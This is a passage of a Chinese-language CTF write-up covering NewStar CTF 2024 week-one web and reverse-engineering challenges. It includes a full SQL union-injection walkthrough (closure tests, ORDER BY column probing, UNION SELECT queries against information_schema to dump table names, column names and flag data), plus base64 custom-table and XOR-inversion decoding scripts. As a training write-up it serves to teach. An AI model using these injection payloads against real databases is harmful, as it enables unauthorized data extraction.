&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&quot;/api/flag/s34l&quot;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">headers</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">          &#125;,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">csrf_token</span>: <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;csrf_token&quot;</span>).<span class="property">value</span>,</span></span><br><span class="line"><span class="language-javascript">          &#125;),</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">const</span> data = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span></span><br><span class="line"><span class="language-javascript">          messageElement.<span class="property">textContent</span> = <span class="string">`第三部分Flag: <span class="subst">$&#123;</span></span></span></span><br><span class="line"><span class="subst"><span class="string"><span class="language-javascript">            data.flag</span></span></span></span><br><span class="line"><span class="subst"><span class="string"><span class="language-javascript">          &#125;</span>, 你解救了五条悟！下一关: /<span class="subst">$&#123;data.nextLevel || <span class="string">&quot;无&quot;</span>&#125;</span>`</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">          messageElement.<span class="property">textContent</span> = <span class="string">&quot;请求失败，请重试。&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125; <span class="keyword">catch</span> (error) &#123;</span></span><br><span class="line"><span class="language-javascript">        messageElement.<span class="property">textContent</span> = <span class="string">&quot;请求过程中出现错误，请重试。&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">  &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里仍然有多种解决方案</p><ol><li class="lvl-3"><p>发送 post 请求</p></li><li class="lvl-3"><p>修改前端</p></li></ol><h5 id="flag4">flag4</h5><p>同样是根据源码发送请求，也可以根据源码提示 <code>&lt;noscript&gt;</code> 禁用 js，可以使用浏览器插件，也可以改浏览器设置。</p><h5 id="end">end</h5><p>最后将所有 flag 拼起来，base64 解密即可</p><h4 id="谢谢皮蛋">谢谢皮蛋</h4><p>这是一个 sql 联合注入题</p><p><a href="https://blog.csdn.net/fly_enum/article/details/135307756">【超详细版】SQL 注入原理及思路绕过(看这篇就够了)-CSDN 博客</a></p><p>根据源码提示到 <code>/hint.php</code> 寻找线索</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT uname,position FROM hexo WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">或许你可以了解下联合注入</span><br></pre></td></tr></table></figure><p>注意 hint.php 中的 <code>LIMIT 0,1</code> ，说明只返回一行数据</p><p>注入一般步骤：</p><ol><li class="lvl-3"><p>判断注入点</p></li><li class="lvl-3"><p>判断闭合形式</p></li><li class="lvl-3"><p>判断可查询的属性数</p></li><li class="lvl-3"><p>判断回显位</p></li><li class="lvl-3"><p>获取数据库名</p></li><li class="lvl-3"><p>获取表名</p></li><li class="lvl-3"><p>获取某表所有列名</p></li><li class="lvl-3"><p>获取数据</p></li></ol><h5 id="注入点">注入点</h5><p>目标网址只有一个表单，而且 url 不变，很容易判断注入点就是输入栏</p><h5 id="闭合形式">闭合形式</h5><p>sql 有 <code>数字型</code>和 <code>字符型</code>，闭合方式有 <code>整形</code> | <code>'</code> | <code>''</code> 三种形式</p><table><thead><tr><th>输入</th><th>回显是否正常</th><th>闭合方式</th></tr></thead><tbody><tr><td>1&quot; and “1”=&quot;1</td><td>正常</td><td>‘’ 形</td></tr><tr><td>1’ and ‘1’='1</td><td>正常</td><td>’ 形</td></tr><tr><td>1 and 1 = 1</td><td>正常</td><td>整形</td></tr></tbody></table><p>尝试后发现为整形</p><h5 id="判断可查询的属性列数">判断可查询的属性列数</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> n #</span><br></pre></td></tr></table></figure><p>这里 <code>1</code> 为整形输入，<code>order by</code> 为 sql 语句，用于根据指定的列(n)对结果集进行排序。</p><p>注意到最后有一个 <code>#</code> 符号，这是 sql 中注释符号，表示从此开始后面的内容都被注释掉，从而保证注入语句能被执行。注释符号有很多种：</p><ol><li class="lvl-3"><p>双横线单行注释 <code>--</code></p></li><li class="lvl-3"><p>井号单行注释 <code>#</code></p></li><li class="lvl-3"><p>斜杠星号多行注释 <code>/*...*/</code></p></li></ol><p>举个例子，假设下面是数据库一个表</p><table><thead><tr><th>Country</th><th>2023_GDP</th></tr></thead><tbody><tr><td>China</td><td>176620</td></tr><tr><td>American</td><td>273578</td></tr><tr><td>Germany</td><td>44574</td></tr></tbody></table><p>可以看到，如果按照 GDP 降序，中国应该在美国后面。如果按照 GDP 升序，德国应该在中国前面。下面使用 <code>order by</code> 分别进行操作</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">2023</span>_GDP (<span class="keyword">ASC</span>)→ 按照<span class="number">2023</span>_GDP列使用升序排序,<span class="keyword">ASC</span>可省略</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">2023</span>_GDP <span class="keyword">DESC</span>  → 按照<span class="number">2023</span>_GDP列使用降序排序</span><br></pre></td></tr></table></figure><p>而上述 <code>1 order by n</code> 中的 n ，代指第 n 列，比如上述 GDP 例子，可以将语句中的 2023_GDP 换为 2</p><p>如果 n 超出了最大列数，就会报错，所以可以依据报错得到最大列数</p><p>在此题中，最大列数为 2</p><h5 id="判断回显位">判断回显位</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> ,....,n #</span><br></pre></td></tr></table></figure><p>其中 n 为最大列数</p><p>UNION 的作用是将 select 查询结果合并</p><p>这里注意到语句中使用了-1 而不是 1。这是因为在 hint.php 中 LIMIT 0,1 提示了只返回一条数据，在展示数据的时候只会取结果集的第一行数据。所以这里无论怎么折腾最后只会出来第一行的查询结果。只要传入-1，让第一行查询的结果是空集，即 union 左边的 select 子句查询结果为空，那么 union 右边的查询结果自然就成为了第一行，打印在网页上了</p><h5 id="查看当前页面数据库">查看当前页面数据库</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()#</span><br></pre></td></tr></table></figure><p>database()为显示当前数据库的函数</p><h5 id="获取表名">获取表名</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()#</span><br></pre></td></tr></table></figure><p>很长的一个句子，下面对这个句子拆分，<code>-1 union select 1,</code> 部分和前面一样。 <code>group_concat()</code> 代指一次性显示，<code>table_name</code> 表示表名，组合在一起成为一个聚合函数，将所有表名连接成一个字符串，表名之间用逗号分隔。</p><p><code>from information_schema.tables</code> 中，from 指定了从 information_schema.tables 表选择数据，而 information_schema.tables 是一个系统表，包含数据库所有<strong>表</strong>的信息。</p><p><code>where table_schema=database()</code> 中，where 用于过滤查询结果，table_schema=database()是一个条件，表示只选择当前数据库中的表，database()和上一步一样，表示当前数据库</p><h5 id="获取列名">获取列名</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;Fl4g&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span>database()#</span><br></pre></td></tr></table></figure><p>也是一个很长的句子，与上一个句子不同的是，表名 table_name 换成了 列名 <code>column_name</code>。</p><p><code>information_schema.columns</code> 是一个系统表，包含数据库中所有<strong>列</strong>的信息</p><p><code>where table_name='Fl4g' and table_schema=database()#</code> 同样是过滤，筛选出来当前数据库下名为 Fl4g 的表，Fl4g 是上一步获得的表名。</p><h5 id="获取数据">获取数据</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#分别查询版：</span><br><span class="line"><span class="number">-1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>, id <span class="keyword">FROM</span> Fl4g#</span><br><span class="line"><span class="number">-1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>, des <span class="keyword">FROM</span> Fl4g#</span><br><span class="line"><span class="number">-1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>, <span class="keyword">value</span> <span class="keyword">FROM</span> Fl4g#</span><br><span class="line"></span><br><span class="line">#三合一版(实际上是二合一)：</span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(des),group_concat(<span class="keyword">value</span>) <span class="keyword">from</span> Fl4g#</span><br></pre></td></tr></table></figure><h4 id="PangBai-过家家-1">* PangBai 过家家(1)</h4><p>算是 week1 web 中最难的一道题了，我在 week1 时候也没能解出来。</p><blockquote><p>题目开源：<a href="https://github.com/cnily03-hive/PangBai-HTTP">https://github.com/cnily03-hive/PangBai-HTTP</a></p></blockquote><h5 id="序章">序章</h5><p>动画情节，可以等一会自动开第一关，也可以手动 <code>/start</code> 进入第一关</p><h5 id="第一关">第一关</h5><p>页面提示 <code>Header</code> 有线索，查看开发者工具中的网络项的响应标头，在 Location 字段发现第二关路径</p><h5 id="第二关">第二关</h5><p>题目提示了「Query」和 <code>ask=miao</code>，其中「Query」指的就是 GET 请求的请求参数，在 URL 中路径后面 <code>?</code> 开始就是查询字段，用 <code>&amp;</code> 分隔，遇到特殊字符需要进行 URL Encode 转义。因此我们访问路径 <code>/?ask=miao</code> 即可进入下一关</p><h5 id="第三关">第三关</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用另一种方法（Method）打声招呼（say=hello）吧 ~</span><br></pre></td></tr></table></figure><p>常见的除了 get 请求，还有 post 请求。用 post 请求发送 say=hello</p><h5 id="第四关-→end">第四关 →end</h5><p><a href="https://ns.openctf.net/wp/2024/week1/web/pangbai1.html#%E7%AC%AC%E5%9B%9B%E5%85%B3">PangBai 过家家（1） | WriteUp - NewStar CTF 2024 (openctf.net)</a></p><h3 id="Reverse">Reverse</h3><p>主要考察了 IDA、jadx 等逆向工具的使用</p><p>建议先熟悉 IDA 快捷键，下面是高频使用的几个快捷键</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shift+f12查看所有字符串</span><br><span class="line">x查看引用</span><br><span class="line">a数据转换为字符</span><br><span class="line">f5汇编转伪代码</span><br><span class="line">n修改变量名</span><br><span class="line">esc返回</span><br><span class="line">ctrl+滚轮调整流程图视图</span><br></pre></td></tr></table></figure><h4 id="begin">begin</h4><p><a href="https://hex-rays.com/ida-free#download">IDA</a>入门教程，集中使用上述快捷键，剩下的就是眼力</p><h4 id="base64">base64</h4><p><s>出题人不会简简单单考 base64 的，总会刷着花样搞</s></p><p>shift+f12 一路找到关键函数<br><img src="https://ns.openctf.net/assets/base64_4.Da4eP09W.png" alt="img"></p><p>base64 编码有以下特点</p><blockquote><p>* 字符串只可能包含 A-Z，a-z，0-9，+，/，=字符 * 字符串长度是 4 的倍数 * =只会出现在字符串最后，可能没有或者一个等号或者两个等号</p></blockquote><p>所以此题 base64 编码内容便是第九行末尾那一串了</p><p>但是将这一串丢到常规在线工具中，得到的却不是 flag。说明题目将 base64 魔改了。一般是将 base64 换表了</p><p>base64 标准码表是 <code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code></p><p>这里换成了 <code>WHydo3sThiS7ABLElO0k5trange+CZfVIGRvup81NKQbjmPzU4MDc9Y6q2XwFxJ/</code></p><p>可以使用一款非常好用的在线工具 <code>CyberChef</code> 进行解密</p><p><img src="https://ns.openctf.net/assets/base64_6.D7V0so-t.png" alt="CyberChef"></p><p>也可以搓一个脚本，专门用来自定义 base64 解密，以后遇到的时候可以把编码内容和表丢进去直接用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_base64_decode</span>(<span class="params">encoded_str, custom_charset</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;使用自定义字符集进行 Base64 解码&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 标准 Base64 字符集</span></span><br><span class="line">    standard_charset = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">    <span class="comment"># 创建字符映射表</span></span><br><span class="line">    decode_table = <span class="built_in">str</span>.maketrans(custom_charset, standard_charset)</span><br><span class="line">    <span class="comment"># 将自定义字符集的编码字符串转换为标准 Base64 字符集</span></span><br><span class="line">    standard_encoded_str = encoded_str.translate(decode_table)</span><br><span class="line">    <span class="comment"># 使用标准 Base64 解码</span></span><br><span class="line">    decoded_bytes = base64.b64decode(standard_encoded_str)</span><br><span class="line">    <span class="comment"># 将解码后的字节转换为字符串</span></span><br><span class="line">    decoded_str = decoded_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> decoded_str</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 自定义 Base64 字符集，改为上面的标准字符集就可以解码标准 base64 了</span></span><br><span class="line">    custom_charset = <span class="string">&quot;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&quot;</span></span><br><span class="line">    <span class="comment"># 给定的 Base64 编码字符串</span></span><br><span class="line">    encoded_str = <span class="string">&quot;LgkNCxQ0WhMJVnhUDUFdYlxLQQEqUQ1BX25bE0FcK1wODQsxC0dUUn4YYQ==&quot;</span></span><br><span class="line">    <span class="comment"># 使用自定义字符集进行 Base64 解码</span></span><br><span class="line">    decoded_str = custom_base64_decode(encoded_str, custom_charset)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解码后的字符串:&quot;</span>, decoded_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="ezAndroidStudy">ezAndroidStudy</h4><p>用到了<a href="https://github.com/skylot/jadx">jadx</a>工具，一款专门用于安卓反编译的工具。手机安装好后跟着引导一步步走即可</p><h4 id="Simple-encryption">Simple_encryption</h4><p>丢到 IDA 里，找到关键函数(如何找呢？主要是看字符串，诸如&quot;Enter the flag&quot;“Right”“success”&quot;wrong&quot;等词语，基本就是关键函数了)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  _main(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your flag:&quot;</span>);</span><br><span class="line">  <span class="comment">//要求输入len个字符，点进去看到len是30</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len; ++i )</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>, &amp;input[i]);</span><br><span class="line">  <span class="comment">//下面开始对输入进行处理</span></span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; len; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//如果索引是3的倍数就减31</span></span><br><span class="line">    <span class="keyword">if</span> ( !(j % <span class="number">3</span>) )</span><br><span class="line">      input[j] -= <span class="number">31</span>;</span><br><span class="line">    <span class="comment">//如果索引除3还余1时就加41</span></span><br><span class="line">    <span class="keyword">if</span> ( j % <span class="number">3</span> == <span class="number">1</span> )</span><br><span class="line">      input[j] += <span class="number">41</span>;</span><br><span class="line">    <span class="comment">//如果索引除3还余2时就与0x55异或</span></span><br><span class="line">    <span class="keyword">if</span> ( j % <span class="number">3</span> == <span class="number">2</span> )</span><br><span class="line">      input[j] ^= <span class="number">0x55u</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; len; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%02x &quot;</span>, input[k]);</span><br><span class="line">    <span class="comment">//输入值与buffer[]比较</span></span><br><span class="line">    <span class="keyword">if</span> ( input[k] != buffer[k] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;success!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以只需要将 buffer 数组逆向处理就可以得到 flag，buffer 可以在 ida 中查看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这是官方c语言脚本</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buffer[]=&#123;<span class="number">0x47</span>,<span class="number">0x95</span>,<span class="number">0x34</span>,<span class="number">0x48</span>,<span class="number">0xa4</span>,<span class="number">0x1c</span>,<span class="number">0x35</span>,<span class="number">0x88</span>,<span class="number">0x64</span>,<span class="number">0x16</span>,<span class="number">0x88</span>,<span class="number">0x07</span>,<span class="number">0x14</span>,<span class="number">0x6a</span>,<span class="number">0x39</span>,<span class="number">0x12</span>,<span class="number">0xa2</span>,<span class="number">0x0a</span>,<span class="number">0x37</span>,<span class="number">0x5c</span>,<span class="number">0x07</span>,<span class="number">0x5a</span>,<span class="number">0x56</span>,<span class="number">0x60</span>,<span class="number">0x12</span>,<span class="number">0x76</span>,<span class="number">0x25</span>,<span class="number">0x12</span>,<span class="number">0x8e</span>,<span class="number">0x28</span>&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> len=<span class="number">30</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">3</span>==<span class="number">0</span>)&#123;</span><br><span class="line">            buffer[i]+=<span class="number">0x1f</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">3</span>==<span class="number">1</span>)&#123;</span><br><span class="line">            buffer[i]-=<span class="number">0x29</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">3</span>==<span class="number">2</span>)&#123;</span><br><span class="line">            buffer[i]^=<span class="number">0x55</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,buffer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// flag&#123;IT_15_R3Al1y_V3Ry-51Mp1e&#125;</span></span><br></pre></td></tr></table></figure><h4 id="ez-debug">* ez_debug</h4><p><a href="https://ns.openctf.net/wp/2024/week1/reverse/ez-debug.html">ez_debug | WriteUp - NewStar CTF 2024 (openctf.net)</a></p><p><s>这个题标准是用动调，但是 ai 给我分析一通写了个脚本就完事了，所以这个题只提供官方 wp</s></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
